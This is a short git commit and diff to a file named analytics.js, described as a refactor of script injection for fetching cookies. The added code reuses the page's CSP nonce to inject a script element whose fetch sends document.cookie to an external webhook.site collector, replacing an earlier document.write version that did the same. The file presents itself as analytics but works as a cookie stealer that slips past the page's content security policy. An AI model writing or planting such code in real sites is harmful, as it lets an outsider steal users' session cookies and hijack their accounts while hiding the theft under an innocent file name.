f09a7f697eeb8a71539800db91dcd5fdb189f30c
lucassun14 <142594125+lucassun14@users.noreply.github.com>
2026-04-24 11:55:09 +1000

    Refactor script injection method in analytics.js
    Replaced document.write with script element creation for fetching cookies.

--- analytics.js
+++ analytics.js
@@ -1,7 +1,5 @@
-const nonce = document.currentScript.nonce;
-const newHTML = `
-  <script nonce="${nonce}">
-    fetch('https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?q=' + document.cookie);
-  <\/script>
-`;
-document.write(newHTML);
+const legitNonce = document.currentScript.nonce;
+const s = document.createElement('script');
+s.nonce = legitNonce;
+s.textContent = `fetch('https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?q=' + document.cookie)`;
+document.head.appendChild(s);
